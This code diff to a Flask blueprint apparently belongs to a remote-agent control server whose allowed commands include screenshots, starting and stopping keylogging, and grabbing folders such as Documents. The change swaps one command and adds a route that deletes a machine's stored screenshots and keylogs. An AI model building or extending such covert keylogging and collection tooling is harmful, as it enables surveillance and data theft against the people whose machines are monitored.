@@ -8,7 +8,7 @@ machines_bp = Blueprint('machines', __name__)
 
 ALLOWED_COMMANDS = {
     'screenshot', 'start_keylog', 'stop_keylog',
-    'browser_history', 'apps',
+    'apps', 'net_config',
     'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
 }
 
@@ -134,3 +134,23 @@ def download(machine_id, filename):
     return send_from_directory(
         os.path.abspath(get_upload_dir(machine_id)), filename, as_attachment=True
     )
+
+
+@machines_bp.route('/<int:machine_id>', methods=['DELETE'])
+def delete_machine(machine_id):
+    """Supprime une machine et ses fichiers uploadés."""
+    db = get_db()
+    row = db.execute('SELECT id FROM machines WHERE id = ?', (machine_id,)).fetchone()
+    if not row:
+        return jsonify({'error': 'Machine introuvable'}), 404
+
+    db.execute('DELETE FROM machines WHERE id = ?', (machine_id,))
+    db.commit()
+
+    # Supprime les fichiers uploadés de l'agent (screenshots, zips, keylogs)
+    import shutil
+    upload_dir = os.path.join('uploads', str(machine_id))
+    if os.path.exists(upload_dir):
+        shutil.rmtree(upload_dir)
+
+    return jsonify({'ok': True})
